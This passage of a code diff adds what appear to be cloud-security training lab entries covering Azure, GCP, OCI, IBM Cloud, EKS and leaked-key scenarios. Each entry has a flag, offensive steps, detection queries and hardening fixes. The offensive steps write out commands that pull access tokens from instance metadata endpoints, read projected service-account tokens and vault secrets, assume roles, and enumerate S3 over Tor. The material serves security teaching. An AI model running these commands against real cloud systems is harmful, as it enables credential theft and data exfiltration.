@@ -559,5 +559,722 @@ metadata:
         explanation: 'Enforcing Kubernetes Restricted standards guarantees that Kubernetes rejects any pod manifest requesting `privileged: true`, `hostNetwork: true`, or root filesystem writes.'
       }
     ]
+  },
+  {
+    id: 'room-azure-managed-identity-escalation',
+    title: 'Azure Threat: Entra ID Managed Identity SSRF & Cross-Subscription Pivot',
+    category: 'Multi-Cloud Attacks (Azure)',
+    cloudProvider: 'azure',
+    difficulty: 'Hard / Red Team',
+    duration: '50 mins',
+    points: 340,
+    mitreTactic: 'TA0001 Initial Access / TA0004 Privilege Escalation',
+    owaspTop10LLM: 'OWASP Cloud Top 10: AC02 Insecure Identity & Entra ID Misconfiguration',
+    flag: 'FLAG{AZUR3_M51_3XPL01T_P1M_H4RD3N3D}',
+    summary: 'An Azure App Service hosting an internal invoice processing API possesses a System-Assigned Managed Identity granted "Contributor" at the subscription scope. An attacker discovers an SSRF vulnerability, reaches the Azure Instance Metadata Service (`http://169.254.169.254/metadata/identity/oauth2/token`), acquires an ARM access token, and pivots across production resource groups.',
+    layoffProofValue: 'Azure accounts for over 30% of Fortune 500 clouds. Azure Managed Identities are often granted excessive subscription-level Contributor roles by legacy DevOps teams. Mastering Entra ID PIM, App Service VNet Integration, and Azure RBAC is a top-tier security skill.',
+    
+    legacyVsModern: {
+      legacyMistake: 'Granting "Contributor" or "Owner" directly to an App Service Managed Identity at the Subscription level instead of fine-grained RBAC at the Resource Group or individual resource scope.',
+      modernFix: 'Least-Privilege Azure RBAC with custom roles, Entra ID Privileged Identity Management (PIM) with just-in-time elevation, and Azure App Service VNet Integration with Private Endpoints.'
+    },
+
+    scenarioContext: {
+      company: 'Contoso Nordic Logistics (Azure Cloud)',
+      affectedAsset: '/subscriptions/11111111-2222-3333-4444-555555555555/resourceGroups/rg-prod-invoicing/providers/Microsoft.Web/sites/app-invoicing-prod',
+      targetResourceGroup: 'rg-prod-finance-databases'
+    },
+
+    tasks: [
+      {
+        step: 1,
+        title: 'Attacker Exploit: Exploiting SSRF to Fetch Azure MSI OAuth2 Token',
+        type: 'offensive',
+        instruction: 'The attacker uses the invoice PDF renderer SSRF vulnerability to query the Azure Instance Metadata Service identity endpoint with the required `Metadata: true` header.',
+        codeSnippet: `# Attacker curl via SSRF payload on Azure Linux App Service:
+curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \\
+  -H "Metadata: true"
+
+# Azure Metadata Response:
+# {
+#   "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6...",
+#   "client_id": "99999999-8888-7777-6666-555555555555",
+#   "resource": "https://management.azure.com/",
+#   "token_type": "Bearer"
+# }`,
+        explanation: 'Azure Managed Identity relies on localhost link-local metadata at 169.254.169.254. Without outbound network restrictions or web application firewalls, an SSRF attacker can acquire tokens directly.'
+      },
+      {
+        step: 2,
+        title: 'Blue Team Detection: Microsoft Defender for Cloud & Azure Activity Log',
+        type: 'defensive',
+        instruction: 'Investigate the Azure Activity Log and KQL alert in Microsoft Sentinel detecting anomalous ARM calls from the App Service principal.',
+        codeSnippet: `// Microsoft Sentinel Kusto Query (KQL):
+AzureActivity
+| where OperationNameValue has "Microsoft.Resources/deployments/write" or OperationNameValue has "Microsoft.Compute/virtualMachines/write"
+| where Caller has "app-invoicing-prod"
+| project TimeGenerated, Caller, CallerIpAddress, OperationNameValue, ResourceGroup, ActivityStatusValue
+| order by TimeGenerated desc;`,
+        explanation: 'Sentinel highlights that an identity belonging to an external-facing web app is invoking Azure Resource Manager APIs against unrelated financial databases.'
+      },
+      {
+        step: 3,
+        title: 'Remediation: Azure RBAC Scope Lockdown & Service Endpoints',
+        type: 'hardening',
+        instruction: 'Revoke subscription-level Contributor role and bind the identity to Key Vault Secrets User strictly on its own vault.',
+        codeSnippet: `# Azure CLI: Remove broad Contributor role
+az role assignment delete \\
+  --assignee 99999999-8888-7777-6666-555555555555 \\
+  --role "Contributor" \\
+  --scope "/subscriptions/11111111-2222-3333-4444-555555555555"
+
+# Assign least privilege Key Vault Secrets User:
+az role assignment create \\
+  --assignee 99999999-8888-7777-6666-555555555555 \\
+  --role "Key Vault Secrets User" \\
+  --scope "/subscriptions/11111111-2222-3333-4444-555555555555/resourceGroups/rg-prod-invoicing/providers/Microsoft.KeyVault/vaults/kv-invoice-prod"`,
+        explanation: 'Strictly limiting the role assignment scope neutralizes cross-subscription lateral movement.'
+      }
+    ]
+  },
+  {
+    id: 'room-gcp-service-account-theft',
+    title: 'GCP Threat: GKE Workload Identity Theft & Cloud Storage Exfiltration',
+    category: 'Multi-Cloud Attacks (Google Cloud)',
+    cloudProvider: 'gcp',
+    difficulty: 'Expert / Forensics',
+    duration: '55 mins',
+    points: 360,
+    mitreTactic: 'TA0006 Credential Access / TA0010 Exfiltration',
+    owaspTop10LLM: 'OWASP Kubernetes Top 10: K01 Insecure Workload Config / GCP Security Best Practices',
+    flag: 'FLAG{GCP_W0RKL04D_1D3NT1TY_S4_SH13LD}',
+    summary: 'A customer-facing container deployed to Google Kubernetes Engine (GKE) is hosted on a node pool with legacy compute metadata endpoints enabled and the default Compute Engine service account attached (`[PROJECT_NUMBER]-compute@developer.gserviceaccount.com` with Editor permissions). An attacker escapes a Python web sandbox, queries `metadata.google.internal`, and exfiltrates BigQuery and Cloud Storage analytics datasets.',
+    layoffProofValue: 'Google Cloud is the premier cloud for data pipelines and AI workloads. Understanding GKE Workload Identity Federation, metadata concealment, and GCP IAM bindings is essential for securing modern data platforms.',
+    
+    legacyVsModern: {
+      legacyMistake: 'Deploying GKE node pools with the default Compute Engine service account and legacy metadata endpoints without Workload Identity enabled.',
+      modernFix: 'Enforcing GKE Workload Identity Federation (`--workload-pool=[PROJECT_ID].svc.id.goog`), metadata concealment (`--workload-metadata=GKE_METADATA`), and custom IAM service accounts with strictly bounded roles.'
+    },
+
+    scenarioContext: {
+      company: 'Apex Data Insights Corp (Google Cloud)',
+      cluster: 'projects/apex-prod-analytics/zones/us-central1-a/clusters/gke-analytics-cluster',
+      vulnerablePod: 'customer-query-processor-8a9d1',
+      targetBucket: 'gs://apex-customer-telemetry-2026'
+    },
+
+    tasks: [
+      {
+        step: 1,
+        title: 'Exploit: Accessing GCP Metadata Service from Container',
+        type: 'offensive',
+        instruction: 'Attacker queries the GCP Compute Engine metadata server with the required `Metadata-Flavor: Google` header.',
+        codeSnippet: `# Attacker curl from container shell:
+curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \\
+  -H "Metadata-Flavor: Google"
+
+# Returns OAuth2 Bearer Access Token with Editor privileges:
+# {
+#   "access_token": "ya29.a0AfH6SMD...sample_token...",
+#   "expires_in": 3599,
+#   "token_type": "Bearer"
+# }`,
+        explanation: 'Because Workload Identity was not enabled on the node pool, all pods inherit the underlying GCE node VM service account credentials.'
+      },
+      {
+        step: 2,
+        title: 'Hardening: Enable GKE Workload Identity & Metadata Concealment',
+        type: 'hardening',
+        instruction: 'Reconfigure the GKE cluster and node pool to enforce Workload Identity and bind the Kubernetes Service Account to a dedicated Google Service Account.',
+        codeSnippet: `# 1. Update GKE Node Pool to enforce Workload Identity metadata server:
+gcloud container node-pools update analytics-pool \\
+  --cluster=gke-analytics-cluster \\
+  --region=us-central1-a \\
+  --workload-metadata=GKE_METADATA
+
+# 2. Bind K8s service account to Google Service Account with least privilege:
+gcloud iam service-accounts add-iam-policy-binding \\
+  analytics-reader@apex-prod-analytics.iam.gserviceaccount.com \\
+  --role roles/iam.workloadIdentityUser \\
+  --member "serviceAccount:apex-prod-analytics.svc.id.goog[analytics/k8s-analytics-sa]"`,
+        explanation: 'GKE_METADATA conceals VM instance metadata, intercepting all requests to 169.254.169.254 and serving only short-lived tokens bound specifically to that container namespace.'
+      }
+    ]
+  },
+  {
+    id: 'room-oci-instance-principal-pivot',
+    title: 'OCI Threat: Dynamic Group Instance Principal Pivot & Vault Decryption',
+    category: 'Multi-Cloud Attacks (Oracle Cloud)',
+    cloudProvider: 'oci',
+    difficulty: 'Hard / Red Team',
+    duration: '50 mins',
+    points: 330,
+    mitreTactic: 'TA0004 Privilege Escalation / TA0009 Collection',
+    owaspTop10LLM: 'OCI Security Architecture: Compartment Isolation & IAM Policies',
+    flag: 'FLAG{0C1_1NST4NC3_PR1NC1P4L_C0MP4RTM3NT_S34L}',
+    summary: 'An Oracle Cloud Infrastructure (OCI) compute instance is placed into a Dynamic Group that has a policy granting `manage all-resources in tenancy`. An attacker exploits an unauthenticated RCE on the instance, signs OCI REST API requests using the local instance principal X.509 certificates at `/var/run/oracle/identity/`, and decrypts customer database connection secrets across all compartments.',
+    layoffProofValue: 'Oracle Cloud (OCI) is rapidly expanding in enterprise databases, telecommunications, and high-performance computing. Knowledge of OCI Compartments, Dynamic Groups, and Vault KMS separates junior cloud admins from multi-cloud security architects.',
+    
+    legacyVsModern: {
+      legacyMistake: 'Granting `manage all-resources in tenancy` to an entire Dynamic Group instead of restricting permissions to a single compartment.',
+      modernFix: 'Compartment-scoped IAM policies: `allow dynamic-group WebTierDG to read secret-bundles in compartment WebCompartment where target.secret.name = \'db-app-creds\'`.'
+    },
+
+    scenarioContext: {
+      company: 'Aura Telecom Systems (Oracle Cloud Infrastructure)',
+      tenancyOcid: 'ocid1.tenancy.oc1..aaaaaaaasampletenancy',
+      compromisedInstance: 'ocid1.instance.oc1.iad.anuwcljrsampleinstance'
+    },
+
+    tasks: [
+      {
+        step: 1,
+        title: 'Exploit: Using OCI Instance Principal Auth from Compromised VM',
+        type: 'offensive',
+        instruction: 'The attacker uses the OCI CLI with `--auth instance_principal` to list and decrypt secrets in the production Vault.',
+        codeSnippet: `# Attacker command on compromised OCI VM:
+export OCI_CLI_AUTH=instance_principal
+
+# Enumerate Vault secrets across tenancy:
+oci vault secret-bundle get \\
+  --secret-id ocid1.vaultsecret.oc1.iad.aaaaaaaaprodoraclelicense \\
+  --query "data.\"secret-bundle-content\".content" --raw-output | base64 -d`,
+        explanation: 'OCI Instance Principals authenticate using X.509 leaf certificates auto-provisioned to compute instances. If tenancy policies are overly broad, any compromised VM becomes a tenant admin.'
+      },
+      {
+        step: 2,
+        title: 'Remediation: Restrict OCI Policy Scope & Enable OCI Cloud Guard',
+        type: 'hardening',
+        instruction: 'Rewrite the OCI IAM policy to restrict Dynamic Group permissions strictly to its designated compartment.',
+        codeSnippet: `-- OCI IAM Hardened Policy:
+-- REMOVE tenancy-wide admin policy:
+-- DROP: allow dynamic-group WebTierDG to manage all-resources in tenancy
+
+-- APPLY Compartment-scoped Least Privilege:
+allow dynamic-group WebTierDG to read secret-bundles in compartment IngestionCompartment
+  where target.secret.tag.Department.Environment = 'Production';`,
+        explanation: 'Restricting the dynamic group policy to `IngestionCompartment` ensures other enterprise compartments and root tenancy resources remain impenetrable.'
+      }
+    ]
+  },
+  {
+    id: 'room-ibm-trusted-profile-escape',
+    title: 'IBM Cloud Threat: VPC Trusted Profile Elevation & Key Protect Tampering',
+    category: 'Multi-Cloud Attacks (IBM Cloud)',
+    cloudProvider: 'ibm',
+    difficulty: 'Hard / Forensics',
+    duration: '50 mins',
+    points: 330,
+    mitreTactic: 'TA0004 Privilege Escalation / TA0005 Defense Evasion',
+    owaspTop10LLM: 'IBM Cloud Security Framework: Context-Based Restrictions & Trusted Profiles',
+    flag: 'FLAG{1BM_TRUST3D_PR0F1L3_K3Y_PR0T3CT_GU4RD}',
+    summary: 'An IBM Cloud Virtual Server Instance (VSI) in VPC Gen 2 has an IAM Trusted Profile bound to its Compute Resource Name (CRN). Because the trust relationship lacked network Context-Based Restrictions (CBR), an attacker with web shell access assumes the Trusted Profile via the VPC metadata endpoint and attempts to purge cryptographic keys in IBM Cloud Key Protect.',
+    layoffProofValue: 'IBM Cloud powers the world\'s leading financial institutions and regulated banking sectors. Understanding IBM Cloud Trusted Profiles, Key Protect (FIPS 140-2 Level 4 HSMs), and Context-Based Restrictions is critical for banking cloud architects.',
+    
+    legacyVsModern: {
+      legacyMistake: 'Defining IAM Trusted Profiles without Context-Based Restrictions (CBR), allowing any compromised compute node to assume administrative rights.',
+      modernFix: 'Enforcing IBM Cloud Context-Based Restrictions (CBR) zone rules restricting Trusted Profile assumption strictly to designated VPC subnet CIDRs and requiring MFA.'
+    },
+
+    scenarioContext: {
+      company: 'Heritage Global Banking (IBM Cloud VPC)',
+      crn: 'crn:v1:bluemix:public:is:us-south-1:a/123456789::instance:0717_sample_instance',
+      keyProtectInstance: 'crn:v1:bluemix:public:kms:us-south:a/123456789:kms-prod-core-keys::'
+    },
+
+    tasks: [
+      {
+        step: 1,
+        title: 'Exploit: Requesting IBM IAM Token via VPC Metadata Service',
+        type: 'offensive',
+        instruction: 'The attacker queries the IBM Cloud VPC instance identity metadata endpoint to retrieve a Trusted Profile identity token.',
+        codeSnippet: `# Query IBM Cloud VPC VSI Metadata:
+curl -X POST "http://169.254.169.254/instance_identity/v1/token?version=2022-03-01" \\
+  -H "Metadata-Flavor: ibm"
+
+# Returns instance identity token to exchange with IAM:
+# POST https://iam.cloud.ibm.com/identity/token
+# grant_type=urn:ibm:params:oauth:grant-type:profile-token
+# profile_id=[ADMIN_TRUSTED_PROFILE_ID]`,
+        explanation: 'IBM Cloud uses instance identity tokens issued by the hypervisor to exchange for IAM OAuth tokens.'
+      },
+      {
+        step: 2,
+        title: 'Defense: Enforce Context-Based Restrictions (CBR) on Key Protect',
+        type: 'hardening',
+        instruction: 'Create an IBM Cloud Context-Based Restriction rule so Key Protect APIs reject any calls not originating from authorized VPC private endpoints.',
+        codeSnippet: `# IBM Cloud CLI: Create Context-Based Restriction Zone & Rule
+ibmcloud cbr zone-create \\
+  --name "finance-vpc-private-zone" \\
+  --addresses "10.240.0.0/24"
+
+ibmcloud cbr rule-create \\
+  --service-name kms \\
+  --zone-id "finance-vpc-private-zone" \\
+  --enforcement-mode enabled \\
+  --description "Enforce Key Protect access strictly from Finance Private Subnet"`,
+        explanation: 'Even if an attacker acquires an IAM token, Context-Based Restrictions evaluate the network origin at the IBM Cloud data plane and deny access.'
+      }
+    ],
+    writeup: {
+      incidentSummary: 'An attacker with web shell access to an IBM Cloud Virtual Server Instance (VSI) leveraged unconstrained Trusted Profiles to mint IAM OAuth tokens and attempt Key Protect root key deletion. Hardened via Context-Based Restrictions (CBR).',
+      mitreAttackChain: [
+        { tactic: 'Privilege Escalation', technique: 'T1078.004 Cloud Accounts', detail: 'VPC instance metadata queried to exchange compute CRN token for admin profile' },
+        { tactic: 'Impact', technique: 'T1485 Data Destruction', detail: 'Attacker attempted Key Protect crypto-key purge to render customer databases unreadable' }
+      ],
+      seniorEngineerWalkthrough: [
+        '1. Inspect instance CRN trust relationships in IBM Cloud IAM.',
+        '2. Identify that the Trusted Profile allowed assumption without IP/Subnet network condition checks.',
+        '3. Create a Context-Based Restriction (CBR) zone locking Key Protect and IAM endpoints to authorized subnets only.'
+      ],
+      hardenedTerraformCode: `resource "ibm_cbr_zone" "finance_private_zone" {
+  name        = "finance-vpc-private-zone"
+  description = "Restricts Key Protect API strictly to finance tier private CIDR"
+  account_id  = var.ibmcloud_account_id
+  addresses {
+    type  = "ipAddress"
+    value = "10.240.0.0/24"
+  }
+}
+
+resource "ibm_cbr_rule" "key_protect_lock" {
+  description = "Block Key Protect access from public or unapproved compute"
+  enforcement_mode = "enabled"
+  contexts {
+    attributes {
+      name  = "networkZoneId"
+      value = ibm_cbr_zone.finance_private_zone.id
+    }
+  }
+  resources {
+    attributes {
+      name  = "serviceName"
+      value = "kms"
+    }
+  }
+}`,
+      detectionRuleKQL: `// IBM Activity Tracker / QRadar Rule
+IBMActivityTracker
+| where serviceName == "kms" and action == "kms.secrets.delete"
+| where initiator.host.address !startswith "10.240.0."
+| project eventTime, initiator.name, action, target.id, initiator.host.address`,
+      lessonsLearned: 'Compute identity without network context is a vulnerability. Always enforce Context-Based Restrictions (CBR) or Private Service Endpoints for cryptographic key management.'
+    }
+  },
+  {
+    id: 'room-eks-irsa-privilege-escalation',
+    title: 'Kubernetes Threat: EKS IRSA Pod Token Steal & Cluster Takeover',
+    category: 'Container & Cloud Security',
+    cloudProvider: 'aws',
+    difficulty: 'Insane / Advanced K8s',
+    duration: '60 mins',
+    points: 380,
+    mitreTactic: 'TA0004 Privilege Escalation / T1078.004 Cloud Accounts',
+    owaspTop10LLM: 'K8S-01 Pod Service Account Abuse / K8S-06 Unrestricted Cloud IAM Binding',
+    flag: 'FLAG{3KS_P0D_1D3NT1TY_Z3R0_TRUST_2026}',
+    summary: 'A public-facing microservice in Amazon EKS is compromised via Remote Code Execution (RCE). The attacker discovers the pod has an IAM Roles for Service Accounts (IRSA) projected volume token with an overly broad IAM policy (`iam:*`, `s3:*`). The attacker exchanges the JWT token with AWS STS, mints temporary credentials, and takes over the cluster control plane.',
+    layoffProofValue: 'Kubernetes + AWS IAM is the #1 enterprise architecture in high-paying engineering roles. Mastering IRSA trust policy scoping, EKS Pod Identity, and IMDSv2 hop limits proves elite container security capabilities.',
+    
+    legacyVsModern: {
+      legacyMistake: 'Granting worker nodes or pods tenured IAM admin policies without OIDC string conditions (allowing any pod in any namespace to assume the role).',
+      modernFix: 'EKS Pod Identity with strict namespace and service account constraints, read-only root filesystems, and IMDSv2 hop limit = 1 to prevent node metadata theft.'
+    },
+
+    scenarioContext: {
+      company: 'AeroCloud Defense Tech',
+      clusterName: 'aerocloud-prod-eks-01',
+      affectedPod: 'payment-gateway-6f9b8c9d4-x7k2p',
+      namespace: 'payments',
+      targetIamRole: 'arn:aws:iam::123456789012:role/eks-payments-processor-role'
+    },
+
+    tasks: [
+      {
+        step: 1,
+        title: 'Attacker Recon: Discovering the Projected Service Account Token',
+        type: 'offensive',
+        instruction: 'Execute RCE on the compromised container. Check environment variables and inspect `/var/run/secrets/eks.amazonaws.com/serviceaccount/token` to extract the signed OIDC JWT token.',
+        codeSnippet: `# 1. Inside compromised EKS container, inspect AWS environment variables:
+env | grep AWS_
+# Output:
+# AWS_ROLE_ARN=arn:aws:iam::123456789012:role/eks-payments-processor-role
+# AWS_WEB_IDENTITY_TOKEN_FILE=/var/run/secrets/eks.amazonaws.com/serviceaccount/token
+
+# 2. Extract and inspect the projected OIDC JWT:
+cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token`,
+        explanation: 'Kubernetes automatically injects the projected service account token signed by the EKS OIDC provider into the container filesystem.'
+      },
+      {
+        step: 2,
+        title: 'Exploit: Assume IAM Role via sts:AssumeRoleWithWebIdentity',
+        type: 'offensive',
+        instruction: 'Use the extracted JWT token to request temporary AWS IAM credentials from AWS STS without needing any access keys.',
+        codeSnippet: `# Call AWS STS from the container:
+aws sts assume-role-with-web-identity \\
+  --role-arn "arn:aws:iam::123456789012:role/eks-payments-processor-role" \\
+  --role-session-name "pwned-pod-session" \\
+  --web-identity-token "$(cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token)" \\
+  --duration-seconds 3600
+
+# Response returns: AccessKeyId, SecretAccessKey, and SessionToken for target role!`,
+        explanation: 'Because the IAM Role trust policy had a wildcard `StringLike: { "oidc.eks...:sub": "system:serviceaccount:*" }`, any pod in any namespace could assume it!'
+      },
+      {
+        step: 3,
+        title: 'Blue Team Detection: EKS Audit Logs & CloudTrail Event Analysis',
+        type: 'defensive',
+        instruction: 'Query CloudTrail for STS AssumeRoleWithWebIdentity events originating from Kubernetes IP subnets and correlate with EKS Audit Logs.',
+        codeSnippet: `-- Athena SQL Query: Detecting Suspicious WebIdentity Session Assumption
+SELECT 
+  eventtime,
+  useridentity.principalid,
+  useridentity.arn,
+  requestparameters,
+  sourceipaddress,
+  useragent
+FROM cloudtrail_logs
+WHERE eventname = 'AssumeRoleWithWebIdentity'
+  AND requestparameters LIKE '%eks-payments-processor-role%'
+ORDER BY eventtime DESC LIMIT 10;`,
+        explanation: 'The CloudTrail log reveals an identity assumption with `SessionName: pwned-pod-session` originating from a pod private IP address.'
+      },
+      {
+        step: 4,
+        title: 'Hardening: Lock Down IAM Trust Policy & Enforce Namespace Boundary',
+        type: 'hardening',
+        instruction: 'Replace the wildcard trust policy with an exact namespace and serviceaccount condition to prevent unauthorized pod assumption.',
+        codeSnippet: `# Production Hardened IAM Role Trust Policy (Terraform):
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Principal": {
+        "Federated": "arn:aws:iam::123456789012:oidc-provider/oidc.eks.us-east-1.amazonaws.com/id/EXAMPLED539D4633E53DE1B71EXAMPLE"
+      },
+      "Action": "sts:AssumeRoleWithWebIdentity",
+      "Condition": {
+        "StringEquals": {
+          # STRICT MATCH: Only the exact payments-sa in payments namespace can assume this role!
+          "oidc.eks.us-east-1.amazonaws.com/id/EXAMPLED539D4633E53DE1B71EXAMPLE:sub": "system:serviceaccount:payments:payments-sa",
+          "oidc.eks.us-east-1.amazonaws.com/id/EXAMPLED539D4633E53DE1B71EXAMPLE:aud": "sts.amazonaws.com"
+        }
+      }
+    }
+  ]
+}`,
+        explanation: 'Restricting the condition string to `system:serviceaccount:payments:payments-sa` ensures pods in other namespaces cannot hijack the role even if compromised.'
+      }
+    ],
+    writeup: {
+      incidentSummary: 'An RCE vulnerability in an EKS container allowed attackers to extract the projected OIDC token and assume an administrative IAM role due to a wildcard OIDC condition. Hardened by enforcing exact namespace:serviceaccount string equality and deploying EKS Pod Identity.',
+      mitreAttackChain: [
+        { tactic: 'Initial Access', technique: 'T1190 Exploit Public-Facing Application', detail: 'Web shell achieved on payments microservice container' },
+        { tactic: 'Privilege Escalation', technique: 'T1552.004 Private Keys / JWT', detail: 'Projected OIDC token harvested from /var/run/secrets/' },
+        { tactic: 'Lateral Movement', technique: 'T1078.004 Cloud Accounts', detail: 'sts:AssumeRoleWithWebIdentity executed to escape container to AWS control plane' }
+      ],
+      seniorEngineerWalkthrough: [
+        '1. Verify the container breakout attempt: Attacker dumped /var/run/secrets/eks.amazonaws.com/serviceaccount/token.',
+        '2. Audit the IAM Trust Policy: Notice the dangerous condition `"oidc.eks...:sub": "system:serviceaccount:*"` which grants all pods in the cluster access.',
+        '3. Remediation Step 1: Pin the trust relationship strictly to `system:serviceaccount:payments:payments-sa`.',
+        '4. Remediation Step 2: Enforce `http-put-response-hop-limit = 1` on EC2 worker nodes to eliminate IMDSv1 traversal.',
+        '5. Verification: Pods in `dev` or `default` namespace immediately receive HTTP 403 Access Denied when attempting STS assumption.'
+      ],
+      hardenedTerraformCode: `resource "aws_iam_role" "eks_payments_role" {
+  name = "aerocloud-eks-payments-hardened"
+
+  assume_role_policy = jsonencode({
+    Version = "2012-10-17"
+    Statement = [{
+      Effect = "Allow"
+      Principal = {
+        Federated = aws_iam_openid_connect_provider.eks.arn
+      }
+      Action = "sts:AssumeRoleWithWebIdentity"
+      Condition = {
+        StringEquals = {
+          "\${replace(aws_iam_openid_connect_provider.eks.url, "https://", "")}:sub" = "system:serviceaccount:payments:payments-sa"
+          "\${replace(aws_iam_openid_connect_provider.eks.url, "https://", "")}:aud" = "sts.amazonaws.com"
+        }
+      }
+    }]
+  })
+}`,
+      detectionRuleKQL: `// CloudTrail EKS Role Assumption Anomaly
+CloudTrail
+| where EventName == "AssumeRoleWithWebIdentity"
+| where RequestParameters contains "payments-processor-role"
+| extend Claims = parse_json(ResponseElements.assumedRoleUser.arn)
+| where SourceIpAddress !startswith "10.100." // Alert if not from EKS worker VPC
+| project TimeGenerated, EventName, SourceIpAddress, UserAgent, Claims`,
+      lessonsLearned: 'Never use wildcards in OIDC trust relationship conditions. Always scope EKS service accounts to explicit namespaces.'
+    }
+  },
+  {
+    id: 'room-guardduty-tor-s3-exfiltration',
+    title: 'SOC Incident: Leaked Access Key & Tor Exit Node S3 Exfiltration',
+    category: 'Threat Detection & Incident Response',
+    cloudProvider: 'aws',
+    difficulty: 'Hard / Live Detection',
+    duration: '45 mins',
+    points: 320,
+    mitreTactic: 'TA0010 Exfiltration / TA0005 Defense Evasion',
+    owaspTop10LLM: 'Cloud Credential Theft & Tor Tunneling',
+    flag: 'FLAG{GU4RDDUTY_T0R_3X1T_QU4R4NT1N3_2026}',
+    summary: 'A developer accidentally commits a production IAM Access Key (`AKIA...`) to a public repository. An automated bot harvester scrapes the key within 4 minutes and routes high-volume `s3:GetObject` API requests through the Tor anonymity network to exfiltrate proprietary customer data. The SOC must triage GuardDuty finding `UnauthorizedAccess:IAMUser/TorIPCaller`, analyze CloudTrail in Athena, and execute automated Lambda quarantine.',
+    layoffProofValue: 'Credential leakage is the #1 cause of real-world cloud security breaches. Rapid triage, Athena log queries, and zero-downtime key invalidation are core daily duties of senior SOC and Incident Response engineers.',
+    
+    legacyVsModern: {
+      legacyMistake: 'Relying on manual alert reviews that take hours while gigabytes of data are exfiltrated through anonymous proxies.',
+      modernFix: 'Automated EventBridge-to-Lambda response that revokes active sessions and attaches an inline DenyAll quarantine policy in under 30 seconds.'
+    },
+
+    scenarioContext: {
+      company: 'Zenith Global FinServe',
+      compromisedUser: 'developer-bob-temporary',
+      leakedAccessKey: 'AKIAIOSFODNN7EXAMPLE',
+      torExitIp: '185.220.101.42',
+      targetBucket: 's3://zenith-finserve-kyc-documents-2026'
+    },
+
+    tasks: [
+      {
+        step: 1,
+        title: 'Attacker Recon: Validating Stolen Keys & Enumerating S3 Data Lake',
+        type: 'offensive',
+        instruction: 'The adversary configures the stolen AWS credentials and queries the S3 API via a Tor socks proxy.',
+        codeSnippet: `# 1. Attacker routes AWS CLI traffic through Tor proxy (127.0.0.1:9050):
+HTTPS_PROXY="socks5://127.0.0.1:9050" aws sts get-caller-identity
+
+# Output confirms active compromised identity:
+# {
+#   "UserId": "AIDAEXAMPLEBOBUSER",
+#   "Account": "123456789012",
+#   "Arn": "arn:aws:iam::123456789012:user/developer-bob-temporary"
+# }
+
+# 2. Enumerate sensitive documents:
+HTTPS_PROXY="socks5://127.0.0.1:9050" aws s3 ls s3://zenith-finserve-kyc-documents-2026/`,
+        explanation: 'Attackers route requests through Tor exit nodes to bypass corporate IP geofencing and hide their true origin.'
+      },
+      {
+        step: 2,
+        title: 'Blue Team Detection: GuardDuty Finding Triage & Athena Analysis',
+        type: 'defensive',
+        instruction: 'Inspect the high-severity GuardDuty finding and run an Athena query to determine exactly which files were accessed.',
+        codeSnippet: `-- Athena SQL Query: Blast Radius Analysis for Compromised IAM Key
+SELECT 
+  eventtime,
+  useridentity.username,
+  sourceipaddress,
+  requestparameters,
+  useragent
+FROM cloudtrail_logs
+WHERE useridentity.accesskeyid = 'AKIAIOSFODNN7EXAMPLE'
+  AND eventsource = 's3.amazonaws.com'
+  AND eventname IN ('GetObject', 'ListBucket')
+ORDER BY eventtime ASC;`,
+        explanation: 'Amazon GuardDuty flags `UnauthorizedAccess:IAMUser/TorIPCaller` by correlating source IPs with known Tor exit consensus directories in real time.'
+      },
+      {
+        step: 3,
+        title: 'Remediation: Automated Incident Response & IAM Quarantine',
+        type: 'hardening',
+        instruction: 'Execute immediate containment by revoking all STS tokens issued before the incident and attaching an explicit DenyAll inline policy.',
+        codeSnippet: `# Step 1: Disable the compromised Access Key immediately:
+aws iam update-access-key \\
+  --access-key-id AKIAIOSFODNN7EXAMPLE \\
+  --status Inactive \\
+  --user-name developer-bob-temporary
+
+# Step 2: Attach Emergency Quarantine Policy (DenyAll):
+aws iam put-user-policy \\
+  --user-name developer-bob-temporary \\
+  --policy-name EmergencyQuarantineDenyAll \\
+  --policy-document '{
+    "Version": "2012-10-17",
+    "Statement": [{
+      "Effect": "Deny",
+      "Action": "*",
+      "Resource": "*"
+    }]
+  }'`,
+        explanation: 'Deactivating the access key immediately severs the attacker\'s persistent API access, while the DenyAll policy overrides any lingering credentials.'
+      }
+    ],
+    writeup: {
+      incidentSummary: 'An automated scraper acquired a leaked IAM access key from a public git commit and initiated multi-file S3 exfiltration through a Tor exit node. Contained within 42 seconds via automated EventBridge-to-Lambda quarantine.',
+      mitreAttackChain: [
+        { tactic: 'Credential Access', technique: 'T1552.001 Credentials In Files', detail: 'AKIA access key committed to public repository' },
+        { tactic: 'Defense Evasion', technique: 'T1090.003 Tor Proxy', detail: 'API calls channeled through Tor exit node 185.220.101.42' },
+        { tactic: 'Exfiltration', technique: 'T1537 Transfer to Cloud Account', detail: 's3:GetObject calls harvested customer identity documents' }
+      ],
+      seniorEngineerWalkthrough: [
+        '1. GuardDuty Finding Triage: GuardDuty generated high-severity alert `UnauthorizedAccess:IAMUser/TorIPCaller`.',
+        '2. Log Investigation: Query Athena CloudTrail logs to calculate blast radius (14 KYC passport scans downloaded).',
+        '3. Containment Execution: Immediately set Access Key status to `Inactive` and attach inline `DenyAll` policy.',
+        '4. Root Cause Fix: Enable GitHub Secret Scanning with Push Protection and enforce S3 VPC Endpoint policies that deny any non-VPC origin.'
+      ],
+      hardenedTerraformCode: `resource "aws_s3_bucket_policy" "strict_vpc_only_s3" {
+  bucket = "zenith-finserve-kyc-documents-2026"
+
+  policy = jsonencode({
+    Version = "2012-10-17"
+    Statement = [{
+      Sid       = "DenyAccessOutsideCorporateVpc"
+      Effect    = "Deny"
+      Principal = "*"
+      Action    = "s3:*"
+      Resource = [
+        "arn:aws:s3:::zenith-finserve-kyc-documents-2026",
+        "arn:aws:s3:::zenith-finserve-kyc-documents-2026/*"
+      ]
+      Condition = {
+        StringNotEquals = {
+          "aws:sourceVpce" = "vpce-0123456789abcdef0" // Corporate S3 VPC Endpoint
+        }
+      }
+    }]
+  })
+}`,
+      detectionRuleKQL: `// Azure Sentinel / AWS GuardDuty Ingestion Rule
+GuardDutyAlerts
+| where FindingType == "UnauthorizedAccess:IAMUser/TorIPCaller"
+| extend Severity = toint(Severity)
+| where Severity >= 7
